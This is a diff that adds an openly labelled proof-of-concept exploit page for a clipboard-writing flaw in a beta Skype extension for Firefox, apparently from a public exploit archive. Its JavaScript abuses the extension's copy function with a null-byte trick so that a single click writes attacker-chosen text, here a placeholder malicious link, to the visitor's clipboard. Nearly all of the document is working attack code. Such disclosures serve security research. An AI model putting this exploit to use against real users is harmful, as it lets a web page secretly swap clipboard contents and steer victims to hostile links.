@@ -1,0 +1,30 @@
+&lt;!---------------------------------------------------------------------------
+ Skype extension for Firefox BETA 2.2.0.95 Clipboard Writing Vulnerability PoC
+ download: https://developer.skype.com/SkypeToolbars
+ 
+ Author: irk4z[at]yahoo.pl
+ homepage: http://irk4z.wordpress.com/
+ 
+ greets: all friends 
+----------------------------------------------------------------------------&gt;
+&lt;a href=&quot;#&quot; onclick=&quot;check_it();&quot; &gt;test it!&lt;/a&gt;
+
+
+&lt;script type=&quot;text/javascript&quot;&gt;
+
+function copy_to_clipboard( text ){
+	if (skype_tool) {
+		var copy_it = text + &#039;\0+&#039;; //use null byte to copy value, because &#039;+&#039; char must be in string
+		skype_tool.copy_num( copy_it );
+	}
+}
+
+function check_it(){
+	//copy_to_clipboard(&#039;malicious text!!!!!!!!!!!\n\n\n!!&#039;);
+	//copy_to_clipboard(&#039;http://irk4z.wordpress.com/&#039;);
+	copy_to_clipboard(&#039;http://malicious.link.to.bad.page/&#039;);
+	alert(&#039;Done! Check your clipboard!&#039;);
+}
+
+&lt;/script&gt;
+
